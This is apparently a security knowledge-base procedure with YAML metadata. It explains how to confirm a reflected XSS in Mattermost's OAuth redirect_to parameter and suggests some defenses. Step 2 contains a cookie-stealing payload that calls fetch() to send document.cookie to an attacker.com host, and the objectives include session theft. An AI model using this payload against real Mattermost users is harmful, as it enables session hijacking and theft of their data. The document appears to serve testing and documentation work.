---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
tags:
  - xss
  - javascript-execution
  - session-hijacking
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:39.230Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Verify-XSS-JavaScript-Execution

## Summary

This procedure verifies the success of the XSS injection by observing JavaScript execution in the browser, confirming the vulnerability and potential for session theft in the Mattermost OAuth context.

## Description

After injecting the payload via the 'redirect_to' parameter, the browser parses the unsanitized HTML in the response from /oauth/<provider>/mobile_login. The injected <img> tag with empty src triggers the onerror event, executing the JS payload. This runs in the context of the Mattermost domain, allowing access to session cookies and DOM. For admins, it enables privilege escalation; for users, data collection like chat history.

## Requirements

1. Successful execution of prior payload injection
2. Victim's browser accessing the reflected page
3. Developer tools (e.g., browser console) for inspection
4. Attacker-controlled endpoint for exfiltration (optional, for real attacks)

## Defense

Defensive measures and detection strategies:

- Validate and whitelist redirect URLs against known safe domains
- Log and alert on JS errors or onerror events in web logs
- Deploy browser extensions or policies to block XSS (e.g., NoScript)
- Regularly audit source code for unsanitized reflections (e.g., static analysis with tools like Semgrep)

## Objectives

1. Confirm JS execution via alert or console
2. Demonstrate session access (e.g., steal cookies)
3. Validate impact for reporting or exploitation

## Instructions

### Step 1: Render the Injected Page

**Context**: Load the page to trigger HTML parsing and event handlers.

Navigate to the malicious URL in a browser.

> The response includes the reflected redirect_to value in an <a href="..."> tag, now altered to include the payload. Expected: Page renders with injected elements visible in source (View Page Source).

### Step 2: Observe Execution and Inspect

**Context**: Monitor for JS firing and verify context.

Open browser dev tools (F12), watch console/network tabs while loading.

> Onerror triggers alert('zi0Black @ Shielder') or logs to console. For hijacking, modify payload to fetch('https://attacker.com?cookie='+document.cookie). Expected: Popup or network request to attacker server confirms execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[javascript-execution]]
- [[session-hijacking]]
